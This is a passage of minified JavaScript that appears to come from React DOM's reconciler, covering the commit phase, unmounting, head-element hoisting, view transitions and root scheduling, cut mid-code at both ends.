h=0,x=-1,N=-1,O=0,D=0,A=e,z=null;t:for(;;){for(var L;A!==n||s!==0&&A.nodeType!==3||(x=h+s),A!==u||i!==0&&A.nodeType!==3||(N=h+i),A.nodeType===3&&(h+=A.nodeValue.length),(L=A.firstChild)!==null;)z=A,A=L;for(;;){if(A===e)break t;if(z===n&&++O===s&&(x=h),z===u&&++D===i&&(N=h),(L=A.nextSibling)!==null)break;A=z,z=A.parentNode}A=L}n=x===-1||N===-1?null:{start:x,end:N}}else n=null}n=n||{start:0,end:0}}else n=null;for(bu={focusedElem:e,selectionRange:n},kl=!1,a=(a&335544064)===a,We=t,t=a?9270:1024;We!==null;){if(e=We,a&&(n=e.deletions,n!==null))for(s=0;s<n.length;s++)a&&Zo(n[s]);if(e.alternate===null&&(e.flags&2)!==0)a&&m0(e),ps(a);else{if(e.tag===22){if(n=e.alternate,e.memoizedState!==null){n!==null&&n.memoizedState===null&&a&&Zo(n),ps(a);continue}else if(n!==null&&n.memoizedState!==null){a&&m0(e),ps(a);continue}}n=e.child,(e.subtreeFlags&t)!==0&&n!==null?(n.return=e,We=n):(a&&y0(e),ps(a))}}Ct=null}function ps(e){for(;We!==null;){var t=We,a=e,n=t.alternate,i=t.flags;switch(t.tag){case 0:case 11:case 15:break;case 1:if((i&1024)!==0&&n!==null){a=void 0,i=n.memoizedProps,n=n.memoizedState;var s=t.stateNode;try{var u=Mn(t.type,i);a=s.getSnapshotBeforeUpdate(u,n),s.__reactInternalSnapshotBeforeUpdate=a}catch(h){Oe(t,t.return,h)}}break;case 3:if((i&1024)!==0){if(n=t.stateNode.containerInfo,a=n.nodeType,a===9)Au(n);else if(a===1)switch(n.nodeName){case"HEAD":case"HTML":case"BODY":Au(n);break;default:n.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;case 30:a&&n!==null&&(a=Ta(n.memoizedProps,n.stateNode),i=t.memoizedProps,i=wa(i.default,i.update),i!=="none"&&_l(n,a,i,n.memoizedState=[],!0));break;default:if((i&1024)!==0)throw Error(o(163))}if(n=t.sibling,n!==null){n.return=t.return,We=n;break}We=t.return}}function S0(e,t,a){var n=a.flags;switch(a.tag){case 0:case 11:case 15:ua(e,a),n&4&&Ei(5,a);break;case 1:if(ua(e,a),n&4)if(e=a.stateNode,t===null)try{e.componentDidMount()}catch(u){Oe(a,a.return,u)}else{var i=Mn(a.type,t.memoizedProps);t=t.memoizedState;try{e.componentDidUpdate(i,t,e.__reactInternalSnapshotBeforeUpdate)}catch(u){Oe(a,a.return,u)}}n&64&&u0(a),n&512&&ia(a,a.return);break;case 3:if(ua(e,a),n&64&&(e=a.updateQueue,e!==null)){if(t=null,a.child!==null)switch(a.child.tag){case 27:case 5:t=a.child.stateNode;break;case 1:t=a.child.stateNode}try{Wd(e,t)}catch(u){Oe(a,a.return,u)}}break;case 27:t===null&&n&4&&p0(a);case 26:case 5:ua(e,a),t===null&&n&4&&Bo(a),n&512&&ia(a,a.return);break;case 12:ua(e,a);break;case 31:ua(e,a),n&4&&A0(e,a);break;case 13:ua(e,a),n&4&&j0(e,a),n&64&&(e=a.memoizedState,e!==null&&(e=e.dehydrated,e!==null&&(a=Yy.bind(null,a),Tb(e,a))));break;case 22:if(n=a.memoizedState!==null||$e,!n){var s=t!==null&&t.memoizedState!==null||Ne;t=$e,i=Ne,$e=n,(Ne=s)&&!i?(n=2,(a.subtreeFlags&8772)!==0&&(n|=1),Pt(e,a,n)):ua(e,a),$e=t,Ne=i}break;case 30:ua(e,a),n&512&&ia(a,a.return);break;case 7:n&512&&ia(a,a.return);default:ua(e,a)}}function Io(e,t){for(e=e.child;e!==null;)T0(e,t),e=e.sibling}function T0(e,t){switch(e.tag){case 5:case 26:try{var a=e.stateNode;if(t){var n=a.style;typeof n.setProperty=="function"?n.setProperty("display","none","important"):n.display="none"}else{var i=e.stateNode,s=e.memoizedProps.style,u=s!=null&&s.hasOwnProperty("display")?s.display:null;i.style.display=u==null||typeof u=="boolean"?"":(""+u).trim()}}catch(x){Oe(e,e.return,x)}Fo(e,t);break;case 6:try{e.stateNode.nodeValue=t?"":e.memoizedProps,Se=!0}catch(x){Oe(e,e.return,x)}break;case 18:try{var h=e.stateNode;t?mp(h,!0):mp(e.stateNode,!1)}catch(x){Oe(e,e.return,x)}break;case 22:case 23:e.memoizedState===null&&Io(e,t);break;default:Io(e,t)}}function Fo(e,t){if(e.subtreeFlags&67108864)for(e=e.child;e!==null;){e:{var a=e,n=t;switch(a.tag){case 4:T0(a,n);break e;case 22:a.memoizedState===null&&Fo(a,n);break e;default:Fo(a,n)}}e=e.sibling}}function w0(e){var t=e.alternate;t!==null&&(e.alternate=null,w0(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&br(t)),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}var ke=null,bt=!1;function Ft(e,t,a){for(a=a.child;a!==null;)E0(e,t,a),a=a.sibling}function E0(e,t,a){if(wt&&typeof wt.onCommitFiberUnmount=="function")try{wt.onCommitFiberUnmount(Jl,a)}catch{}switch(a.tag){case 26:Ne||rt(a,t),Ft(e,t,a),a.memoizedState?a.memoizedState.count--:a.stateNode&&!Ne&&(a=a.stateNode,a.parentNode.removeChild(a));break;case 27:Ne||rt(a,t),Ai(a);var n=ke,i=bt;sn(a.type)&&(ke=a.stateNode,bt=!1),Ft(e,t,a),Cp(a.stateNode,a.type,a.memoizedProps),ke=n,bt=i;break;case 5:Ne||rt(a,t),Ai(a);case 6:if(a.tag===6&&Ai(a),n=ke,i=bt,ke=null,Ft(e,t,a),ke=n,bt=i,ke!==null)if(bt)try{(ke.nodeType===9?ke.body:ke.nodeName==="HTML"?ke.ownerDocument.body:ke).removeChild(a.stateNode),Se=!0}catch(s){Oe(a,t,s)}else try{ke.removeChild(a.stateNode),Se=!0}catch(s){Oe(a,t,s)}break;case 18:ke!==null&&(bt?(e=ke,pp(e.nodeType===9?e.body:e.nodeName==="HTML"?e.ownerDocument.body:e,a.stateNode),Ll(e)):pp(ke,a.stateNode));break;case 4:n=ke,i=bt,ke=a.stateNode.containerInfo,bt=!0,Ft(e,t,a),ke=n,bt=i;break;case 0:case 11:case 14:case 15:Wa(2,a,t),Ne||Wa(4,a,t),Ft(e,t,a);break;case 1:Ne||(rt(a,t),n=a.stateNode,typeof n.componentWillUnmount=="function"&&f0(a,t,n)),Ft(e,t,a);break;case 21:Ft(e,t,a);break;case 22:Ne=(n=Ne)||a.memoizedState!==null,Ft(e,t,a),Ne=n;break;case 30:rt(a,t),Ft(e,t,a);break;case 7:Ne||rt(a,t),Ft(e,t,a);break;default:Ft(e,t,a)}}function A0(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null))){e=e.dehydrated;try{Ll(e)}catch(a){Oe(t,t.return,a)}}}function j0(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null&&(e=e.dehydrated,e!==null))))try{Ll(e)}catch(a){Oe(t,t.return,a)}}function Oy(e){switch(e.tag){case 31:case 13:case 19:var t=e.stateNode;return t===null&&(t=e.stateNode=new x0),t;case 22:return e=e.stateNode,t=e._retryCache,t===null&&(t=e._retryCache=new x0),t;default:throw Error(o(435,e.tag))}}function ms(e,t){var a=Oy(e);t.forEach(function(n){if(!a.has(n)){a.add(n);var i=Zy.bind(null,e,n);n.then(i,i)}})}function ht(e,t,a){var n=t.deletions;if(n!==null)for(var i=0;i<n.length;i++){var s=n[i],u=e,h=t,x=h;e:for(;x!==null;){switch(x.tag){case 27:if(sn(x.type)){ke=x.stateNode,bt=!1;break e}break;case 5:ke=x.stateNode,bt=!1;break e;case 3:case 4:ke=x.stateNode.containerInfo,bt=!0;break e}x=x.return}if(ke===null)throw Error(o(160));E0(u,h,s),ke=null,bt=!1,u=s.alternate,u!==null&&(u.return=null),s.return=null}if(t.subtreeFlags&13886)for(t=t.child;t!==null;)N0(t,e,a),t=t.sibling}var Jt=null;function N0(e,t,a){var n=e.alternate,i=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(i&4&&(n=e.updateQueue,n=n!==null?n.events:null,n!==null))for(var s=0;s<n.length;s++){var u=n[s];u.ref.impl=u.nextImpl}ht(t,e,a),pt(e),i&4&&(Wa(3,e,e.return),Ei(3,e),Wa(5,e,e.return));break;case 1:ht(t,e,a),pt(e),i&512&&(Ne||n===null||rt(n,n.return)),i&64&&$e&&(e=e.updateQueue,e!==null&&(t=e.callbacks,t!==null&&(a=e.shared.hiddenCallbacks,e.shared.hiddenCallbacks=a===null?t:a.concat(t))));break;case 26:if(s=Jt,ht(t,e,a),pt(e),i&512&&(Ne||n===null||rt(n,n.return)),i&4)if(i=n!==null?n.memoizedState:null,a=e.memoizedState,n===null)if(a===null)if(e.stateNode===null)if($e)e.stateNode=fp(e.type,e.memoizedProps,t.containerInfo,e);else{e:{t=e.type,a=e.memoizedProps,i=s.ownerDocument||s;t:switch(t){case"title":n=i.getElementsByTagName("title")[0],(!n||n[Wl]||n[at]||n.namespaceURI==="http://www.w3.org/2000/svg"||n.hasAttribute("itemprop"))&&(n=i.createElement(t),i.head.insertBefore(n,i.querySelector("head > title"))),st(n,t,a),n[at]=e,Je(n),t=n;break e;case"link":if(s=Mp("link","href",i).get(t+(a.href||""))){for(u=0;u<s.length;u++)if(n=s[u],n.getAttribute("href")===(a.href==null||a.href===""?null:a.href)&&n.getAttribute("rel")===(a.rel==null?null:a.rel)&&n.getAttribute("title")===(a.title==null?null:a.title)&&n.getAttribute("crossorigin")===(a.crossOrigin==null?null:a.crossOrigin)){s.splice(u,1);break t}}n=i.createElement(t),st(n,t,a),i.head.appendChild(n);break;case"meta":if(s=Mp("meta","content",i).get(t+(a.content||""))){for(u=0;u<s.length;u++)if(n=s[u],n.getAttribute("content")===(a.content==null?null:""+a.content)&&n.getAttribute("name")===(a.name==null?null:a.name)&&n.getAttribute("property")===(a.property==null?null:a.property)&&n.getAttribute("http-equiv")===(a.httpEquiv==null?null:a.httpEquiv)&&n.getAttribute("charset")===(a.charSet==null?null:a.charSet)){s.splice(u,1);break t}}n=i.createElement(t),st(n,t,a),i.head.appendChild(n);break;default:throw Error(o(468,t))}n[at]=e,Je(n),t=n}e.stateNode=t}else $e||Du(s,e.type,e.stateNode);else e.stateNode=Up(s,a,e.memoizedProps);else i!==a?(i===null?(t=n.stateNode,t===null||Ne||t.parentNode.removeChild(t)):i.count--,a===null?$e||Du(s,e.type,e.stateNode):Up(s,a,e.memoizedProps)):a===null&&e.stateNode!==null&&ko(e,e.memoizedProps,n.memoizedProps);break;case 27:ht(t,e,a),pt(e),i&512&&(Ne||n===null||rt(n,n.return)),n!==null&&i&4&&ko(e,e.memoizedProps,n.memoizedProps);break;case 5:if(s=ca,ca=!1,ht(t,e,a),ca=s,pt(e),i&512&&(Ne||n===null||rt(n,n.return)),e.flags&32){t=e.stateNode;try{al(t,""),Se=!0}catch(O){Oe(e,e.return,O)}}i&4&&e.stateNode!=null&&(t=e.memoizedProps,ko(e,t,n!==null?n.memoizedProps:t)),i&1024&&(Qo=!0);break;case 6:if(ht(t,e,a),pt(e),i&4){if(e.stateNode===null)throw Error(o(162));t=e.memoizedProps,a=e.stateNode;try{a.nodeValue=t,Se=!0}catch(O){Oe(e,e.return,O)}}break;case 3:if(Se=!1,zs=null,s=Jt,Jt=Hi(t.containerInfo),ht(t,e,a),Jt=s,pt(e),i&4&&n!==null&&n.memoizedState.isDehydrated)try{Ll(t.containerInfo)}catch(O){Oe(e,e.return,O)}Qo&&(Qo=!1,C0(e)),Se=!1;break;case 4:i=ca,ca=$e,n=Ff(),s=Jt,Jt=Hi(e.stateNode.containerInfo),ht(t,e,a),pt(e),Jt=s,Se&&ji&&(hs=!0),Se=n,ca=i;break;case 12:ht(t,e,a),pt(e);break;case 31:ht(t,e,a),pt(e),i&4&&(t=e.updateQueue,t!==null&&(e.updateQueue=null,ms(e,t)));break;case 13:ht(t,e,a),pt(e),e.child.flags&8192&&e.memoizedState!==null!=(n!==null&&n.memoizedState!==null)&&(ys=Tt()),i&4&&(t=e.updateQueue,t!==null&&(e.updateQueue=null,ms(e,t)));break;case 22:s=e.memoizedState!==null,u=n!==null&&n.memoizedState!==null;var h=$e,x=Ne,N=ca;$e=h||s,ca=N||s,Ne=x||u,ht(t,e,a),Ne=x,ca=N,$e=h,pt(e),i&8192&&(t=e.stateNode,t._visibility=s?t._visibility&-2:t._visibility|1,!s||n===null||u||$e||Ne||(t=u||Ne,a=$e,n=Ne,$e=s||$e,Ne=t,en(e,2),$e=a,Ne=n),!s&&ca||Io(e,s)),i&4&&(t=e.updateQueue,t!==null&&(a=t.retryQueue,a!==null&&(t.retryQueue=null,ms(e,a))));break;case 19:ht(t,e,a),pt(e),i&4&&(t=e.updateQueue,t!==null&&(e.updateQueue=null,ms(e,t)));break;case 30:i&512&&(Ne||n===null||rt(n,n.return)),i=Ff(),s=ji,u=(a&335544064)===a,h=e.memoizedProps,ji=u&&wa(h.default,h.update)!=="none",ht(t,e,a),pt(e),u&&n!==null&&Se&&(e.flags|=4),ji=s,Se=i;break;case 21:break;case 7:i&512&&(Ne||n===null||rt(n,n.return)),n&&n.stateNode!==null&&(n.stateNode._fragmentFiber=e);default:ht(t,e,a),pt(e)}}function pt(e){var t=e.flags;if(t&2){try{for(var a,n=e.return;n!==null;){if(h0(n)){a=n;break}n=n.return}n=null;for(var i=e.return;i!==null;){if(Ho(i)){var s=i.stateNode;n===null?n=[s]:n.push(s)}if(Mo(i))break;i=i.return}var u=n;if(a==null)throw Error(o(160));switch(a.tag){case 27:var h=a.stateNode,x=Lo(e);os(e,x,h,u);break;case 5:var N=a.stateNode;a.flags&32&&(al(N,""),a.flags&=-33);var O=Lo(e);os(e,O,N,u);break;case 3:case 4:var D=a.stateNode.containerInfo,A=Lo(e);Go(e,A,D,u);break;default:throw Error(o(161))}}catch(z){Oe(e,e.return,z)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function C0(e){if(e.subtreeFlags&1024)for(e=e.child;e!==null;){var t=e;C0(t),t.tag===5&&t.flags&1024&&(t=t.stateNode,kl=!0,t.reset(),kl=!1),e=e.sibling}}function xl(e,t){if(t.subtreeFlags&9270)for(t=t.child;t!==null;)z0(t,e),t=t.sibling;else _0(t)}function z0(e,t){var a=e.alternate;if(a===null)qo(e,!1);else switch(e.tag){case 3:if(Ko=oa=!1,g0(),xl(t,e),!oa&&!hs){if(e=ra,e!==null)for(var n=0;n<e.length;n+=3){a=e[n];var i=e[n+1];vp(a,e[n+2]),a=a.ownerDocument.documentElement,a!==null&&a.animate({opacity:[0,0],pointerEvents:["none","none"]},{duration:0,fill:"forwards",pseudoElement:"::view-transition-group("+i+")"})}e=t.containerInfo,e=e.nodeType===9?e.documentElement:e.ownerDocument.documentElement,e!==null&&e.style.viewTransitionName===""&&(e.style.viewTransitionName="none",e.animate({opacity:[0,0],pointerEvents:["none","none"]},{duration:0,fill:"forwards",pseudoElement:"::view-transition-group(root)"}),e.animate({width:[0,0],height:[0,0]},{duration:0,fill:"forwards",pseudoElement:"::view-transition"})),Ko=!0}ra=null;break;case 5:xl(t,e);break;case 4:n=oa,oa=!1,xl(t,e),oa&&(hs=!0),oa=n;break;case 22:e.memoizedState===null&&(a.memoizedState!==null?qo(e,!1):xl(t,e));break;case 30:n=oa,i=g0(),oa=!1,xl(t,e),oa&&(e.flags|=4);var s=e.memoizedProps,u=e.stateNode;t=Ta(s,u),u=Ta(a.memoizedProps,u);var h=wa(s.default,s.update);h==="none"?t=!1:(s=a.memoizedState,a.memoizedState=null,a=e.child,yt=0,t=Vo(e,a,t,u,h,s,!0),yt!==(s===null?0:s.length)&&(e.flags|=32)),(e.flags&4)!==0&&t?(Nl(e,e.memoizedProps.onUpdate),ra=i):i!==null&&(i.push.apply(i,ra),ra=i),oa=(e.flags&32)!==0?!0:n;break;default:xl(t,e)}}function ua(e,t){if(t.subtreeFlags&8772)for(t=t.child;t!==null;)S0(e,t.alternate,t),t=t.sibling}function en(e,t){for(e=e.child;e!==null;){var a=e,n=t;switch(a.tag){case 0:case 11:case 14:case 15:Wa(4,a,a.return),en(a,n);break;case 1:rt(a,a.return);var i=a.stateNode;typeof i.componentWillUnmount=="function"&&f0(a,a.return,i),en(a,n);break;case 27:(n&2)!==0&&Cp(a.stateNode,a.type,a.memoizedProps);case 5:rt(a,a.return),a.tag!==5&&a.tag!==27||Ai(a),en(a,n);break;case 6:Ai(a);break;case 26:rt(a,a.return),i=a.stateNode,a.memoizedState!==null||i===null||Ne||i.parentNode.removeChild(i),en(a,n);break;case 22:a.memoizedState===null&&en(a,n);break;case 30:rt(a,a.return),en(a,n);break;case 7:rt(a,a.return);default:en(a,n)}e=e.sibling}}function Pt(e,t,a){for(a=(t.subtreeFlags&8772)!==0?a:a&-2,t=t.child;t!==null;){var n=t.alternate,i=e,s=t,u=s.flags,h=(a&1)!==0;switch(s.tag){case 0:case 11:case 15:Pt(i,s,a),Ei(4,s);break;case 1:if(Pt(i,s,a),n=s,i=n.stateNode,typeof i.componentDidMount=="function")try{i.componentDidMount()}catch(O){Oe(n,n.return,O)}if(n=s,i=n.updateQueue,i!==null){var x=n.stateNode;try{var N=i.shared.hiddenCallbacks;if(N!==null)for(i.shared.hiddenCallbacks=null,i=0;i<N.length;i++)$d(N[i],x)}catch(O){Oe(n,n.return,O)}}h&&u&64&&u0(s),ia(s,s.return);break;case 27:(a&2)!==0&&p0(s);case 5:s.tag!==5&&s.tag!==27||d0(s),Pt(i,s,a),h&&n===null&&u&4&&Bo(s),ia(s,s.return);break;case 6:d0(s);break;case 26:x=s.stateNode,s.memoizedState!==null||x===null||$e||Du(Hi(x.ownerDocument),s.type,x),Pt(i,s,a),h&&n===null&&u&4&&Bo(s),ia(s,s.return);break;case 12:Pt(i,s,a);break;case 31:Pt(i,s,a),h&&u&4&&A0(i,s);break;case 13:Pt(i,s,a),h&&u&4&&j0(i,s);break;case 22:s.memoizedState===null&&Pt(i,s,a),ia(s,s.return);break;case 30:Pt(i,s,a),ia(s,s.return);break;case 7:ia(s,s.return);default:Pt(i,s,a)}t=t.sibling}}function Jo(e,t){var a=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(a=e.memoizedState.cachePool.pool),e=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(e=t.memoizedState.cachePool.pool),e!==a&&(e!=null&&e.refCount++,a!=null&&di(a))}function Po(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&di(e))}function Yt(e,t,a,n){var i=(a&335544064)===a;if(t.subtreeFlags&(i?10262:10256))for(t=t.child;t!==null;)O0(e,t,a,n),t=t.sibling;else i&&b0(t)}function O0(e,t,a,n){var i=(a&335544064)===a;i&&t.alternate===null&&t.return!==null&&t.return.alternate!==null&&ds(t);var s=t.flags;switch(t.tag){case 0:case 11:case 15:Yt(e,t,a,n),s&2048&&Ei(9,t);break;case 1:Yt(e,t,a,n);break;case 3:Yt(e,t,a,n),i&&Ko&&(e=e.containerInfo,e=e.nodeType===9?e.body:e.nodeName==="HTML"?e.ownerDocument.body:e,e.style.viewTransitionName==="root"&&(e.style.viewTransitionName=""),e=e.ownerDocument.documentElement,e!==null&&e.style.viewTransitionName==="none"&&(e.style.viewTransitionName="")),s&2048&&(s=null,t.alternate!==null&&(s=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==s&&(t.refCount++,s!=null&&di(s)));break;case 12:if(s&2048){Yt(e,t,a,n),s=t.stateNode;try{var u=t.memoizedProps,h=u.id,x=u.onPostCommit;typeof x=="function"&&x(h,t.alternate===null?"mount":"update",s.passiveEffectDuration,-0)}catch(N){Oe(t,t.return,N)}}else Yt(e,t,a,n);break;case 31:Yt(e,t,a,n);break;case 13:Yt(e,t,a,n);break;case 23:break;case 22:u=t.stateNode,h=t.alternate,t.memoizedState!==null?(i&&h!==null&&h.memoizedState===null&&ds(h),u._visibility&2?Yt(e,t,a,n):Ni(e,t)):(i&&h!==null&&h.memoizedState!==null&&ds(t),u._visibility&2?Yt(e,t,a,n):(u._visibility|=2,Sl(e,t,a,n,(t.subtreeFlags&10256)!==0||!1))),s&2048&&Jo(h,t);break;case 24:Yt(e,t,a,n),s&2048&&Po(t.alternate,t);break;case 30:i&&(s=t.alternate,s!==null&&(sa(s.child,!0),sa(t.child,!0))),Yt(e,t,a,n);break;default:Yt(e,t,a,n)}}function Sl(e,t,a,n,i){for(i=i&&((t.subtreeFlags&10256)!==0||!1),t=t.child;t!==null;){var s=e,u=t,h=a,x=n,N=u.flags;switch(u.tag){case 0:case 11:case 15:Sl(s,u,h,x,i),Ei(8,u);break;case 23:break;case 22:var O=u.stateNode;u.memoizedState!==null?O._visibility&2?Sl(s,u,h,x,i):Ni(s,u):(O._visibility|=2,Sl(s,u,h,x,i)),i&&N&2048&&Jo(u.alternate,u);break;case 24:Sl(s,u,h,x,i),i&&N&2048&&Po(u.alternate,u);break;default:Sl(s,u,h,x,i)}t=t.sibling}}function Ni(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var a=e,n=t,i=n.flags;switch(n.tag){case 22:Ni(a,n),i&2048&&Jo(n.alternate,n);break;case 24:Ni(a,n),i&2048&&Po(n.alternate,n);break;default:Ni(a,n)}t=t.sibling}}var Hn=8192;function Bn(e,t,a){if(e.subtreeFlags&Hn)for(e=e.child;e!==null;)R0(e,t,a),e=e.sibling}function R0(e,t,a){switch(e.tag){case 26:Bn(e,t,a),e.flags&Hn&&(e.memoizedState!==null?Bb(a,Jt,e.memoizedState,e.memoizedProps):(e=e.stateNode,(t&335544128)===t&&Lp(a,e)));break;case 5:Bn(e,t,a),e.flags&Hn&&(e=e.stateNode,(t&335544128)===t&&Lp(a,e));break;case 3:case 4:var n=Jt;Jt=Hi(e.stateNode.containerInfo),Bn(e,t,a),Jt=n;break;case 22:e.memoizedState===null&&(n=e.alternate,n!==null&&n.memoizedState!==null?(n=Hn,Hn=16777216,Bn(e,t,a),Hn=n):Bn(e,t,a));break;case 30:if((e.flags&Hn)!==0&&(n=e.memoizedProps.name,n!=null&&n!=="auto")){var i=e.stateNode;i.paired=null,Ct===null&&(Ct=new Map),Ct.set(n,i)}Bn(e,t,a);break;default:Bn(e,t,a)}}function D0(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function Ci(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var a=0;a<t.length;a++){var n=t[a];We=n,M0(n,e)}D0(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)U0(e),e=e.sibling}function U0(e){switch(e.tag){case 0:case 11:case 15:Ci(e),e.flags&2048&&Wa(9,e,e.return);break;case 3:Ci(e);break;case 12:Ci(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,gs(e)):Ci(e);break;default:Ci(e)}}function gs(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var a=0;a<t.length;a++){var n=t[a];We=n,M0(n,e)}D0(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:Wa(8,t,t.return),gs(t);break;case 22:a=t.stateNode,a._visibility&2&&(a._visibility&=-3,gs(t));break;default:gs(t)}e=e.sibling}}function M0(e,t){for(;We!==null;){var a=We;switch(a.tag){case 0:case 11:case 15:Wa(8,a,t);break;case 23:case 22:if(a.memoizedState!==null&&a.memoizedState.cachePool!==null){var n=a.memoizedState.cachePool.pool;n!=null&&n.refCount++}break;case 24:di(a.memoizedState.cache)}if(n=a.child,n!==null)n.return=a,We=n;else e:for(a=e;We!==null;){n=We;var i=n.sibling,s=n.return;if(w0(n),n===a){We=null;break e}if(i!==null){i.return=s,We=i;break e}We=s}}}var Ry={getCacheForType:function(e){var t=nt(Ve),a=t.data.get(e);return a===void 0&&(a=e(),t.data.set(e,a)),a},cacheSignal:function(){return nt(Ve).controller.signal}},Dy=typeof WeakMap=="function"?WeakMap:Map,Ee=0,Ue=null,fe=null,pe=0,ze=0,zt=null,tn=!1,Tl=!1,$o=!1,Da=0,Ye=0,an=0,kn=0,vs=0,Ot=0,wl=0,zi=null,_t=null,Wo=!1,ys=0,H0=0,bs=1/0,_s=null,nn=null,Ge=0,$t=null,Ln=null,fa=0,eu=0,tu=null,B0=null,El=null,Al=null,jl=null,Oi=0,xs=null;function Rt(){return(Ee&2)!==0&&pe!==0?pe&-pe:I.T!==null?fu():Gf()}function k0(){if(Ot===0)if((pe&536870912)===0||ue){var e=mr;mr<<=1,(mr&3932160)===0&&(mr=262144),Ot=e}else Ot=536870912;return e=lt.current,e!==null&&(e.flags|=32),Ot}function Nl(e,t){if(t!=null){var a=e.stateNode,n=a.ref;n===null&&(n=a.ref=yp(Ta(e.memoizedProps,a))),Al===null&&(Al=[]),Al.push(t.bind(null,n))}}function xt(e,t,a){(e===Ue&&(ze===2||ze===9)||e.cancelPendingCommit!==null)&&(Cl(e,0),ln(e,pe,Ot,!1)),$l(e,a),((Ee&2)===0||e!==Ue)&&(e===Ue&&((Ee&2)===0&&(kn|=a),Ye===4&&ln(e,pe,Ot,!1)),da(e))}function L0(e,t,a){if((Ee&6)!==0)throw Error(o(327));var n=!a&&(t&127)===0&&(t&e.expiredLanes)===0||Pl(e,t),i=n?Hy(e,t):nu(e,t,!0),s=n;do{if(i===0){Tl&&!n&&ln(e,t,0,!1);break}else{if(a=e.current.alternate,s&&!Uy(a)){i=nu(e,t,!1),s=!1;continue}if(i===2){if(s=t,e.errorRecoveryDisabledLanes&s)var u=0;else u=e.pendingLanes&-536870913,u=u!==0?u:u&536870912?536870912:0;if(u!==0){t=u;e:{var h=e;i=zi;var x=h.current.memoizedState.isDehydrated;if(x&&(Cl(h,u).flags|=256),u=nu(h,u,!1),u!==2&&u!==6){if($o&&!x){h.errorRecoveryDisabledLanes|=s,kn|=s,i=4;break e}s=_t,_t=i,s!==null&&(_t===null?_t=s:_t.push.apply(_t,s))}i=u}if(s=!1,i!==2)continue}}if(i===1){Cl(e,0),ln(e,t,0,!0);break}e:{switch(n=e,s=i,s){case 0:case 1:throw Error(o(345));case 4:if((t&4194048)!==t&&(t&62914560)!==t)break;case 6:ln(n,t,Ot,!tn);break e;case 2:_t=null;break;case 3:case 5:break;default:throw Error(o(329))}if((t&62914560)===t&&(i=ys+300-Tt(),10<i)){if(ln(n,t,Ot,!tn),vr(n,0,!0)!==0)break e;fa=t,n.timeoutHandle=Su(G0.bind(null,n,a,_t,_s,Wo,t,Ot,kn,wl,tn,s,"Throttled",-0,0),i);break e}G0(n,a,_t,_s,Wo,t,Ot,kn,wl,tn,s,null,-0,0)}}break}while(!0);da(e)}function G0(e,t,a,n,i,s,u,h,x,N,O,D,A,z){e.timeoutHandle=-1;var L=t.subtreeFlags,Z=(s&335544064)===s;if(D=null,(Z||L&8192||(L&16785408)===16785408)&&(D={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:aa},Ct=null,R0(t,s,D),Z&&(L=D,Z=e.containerInfo,Z=(Z.nodeType===9?Z:Z.ownerDocument).__reactViewTransition,Z!=null&&(L.count++,L.waitingForViewTransition=!0,L=Li.bind(L),Z.finished.then(L,L))),L=(s&62914560)===s?ys-Tt():(s&4194048)===s?H0-Tt():0,L=kb(D,L),L!==null)){fa=s,e.cancelPendingCommit=L(I0.bind(null,e,t,s,a,n,i,u,h,x,N,O,D,null,A,z)),ln(e,s,u,!N);return}I0(e,t,s,a,n,i,u,h,x,N,O,D)}function Uy(e){for(var t=e;;){var a=t.tag;if((a===0||a===11||a===15)&&t.flags&16384&&(a=t.updateQueue,a!==null&&(a=a.stores,a!==null)))for(var n=0;n<a.length;n++){var i=a[n],s=i.getSnapshot;i=i.value;try{if(!jt(s(),i))return!1}catch{return!1}}if(a=t.child,t.subtreeFlags&16384&&a!==null)a.return=t,t=a;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function ln(e,t,a,n){t=Mf(e,t),t&=~vs,t&=~kn,e.suspendedLanes|=t,e.pingedLanes&=~t,n&&(e.warmLanes|=t),n=e.expirationTimes;for(var i=t;0<i;){var s=31-Et(i),u=1<<s;n[s]=-1,i&=~u}a!==0&&Bf(e,a,t)}function Ss(){return(Ee&6)===0?(Ri(0),!1):!0}function au(){if(fe!==null){if(ze===0)var e=fe.return;else e=fe,ja=An=null,oo(e),ml=null,mi=0,e=fe;for(;e!==null;)o0(e.alternate,e),e=e.return;fe=null}}function Cl(e,t){var a=e.timeoutHandle;return a!==-1&&(e.timeoutHandle=-1,lb(a)),a=e.cancelPendingCommit,a!==null&&(e.cancelPendingCommit=null,a()),fa=0,au(),Ue=e,fe=a=Ea(e.current,null),pe=t,ze=0,zt=null,tn=!1,Tl=Pl(e,t),$o=!1,wl=Ot=vs=kn=an=Ye=0,_t=zi=null,Wo=!1,Da=Mf(e,t),zr(),a}function q0(e,t){ce=null,I.H=ts,t===pl||t===qr?(t=Id(),ze=3):t===Jc?(t=Id(),ze=4):ze=t===Eo?8:t!==null&&typeof t=="object"&&typeof t.then=="function"?6:1,zt=t,fe===null&&(Ye=1,as(e,kt(t,e.current)))}function Y0(){var e=lt.current;return e===null?!0:(pe&4194048)===pe?ut===null:(pe&62914560)===pe||(pe&536870912)!==0?e===ut:!1}function 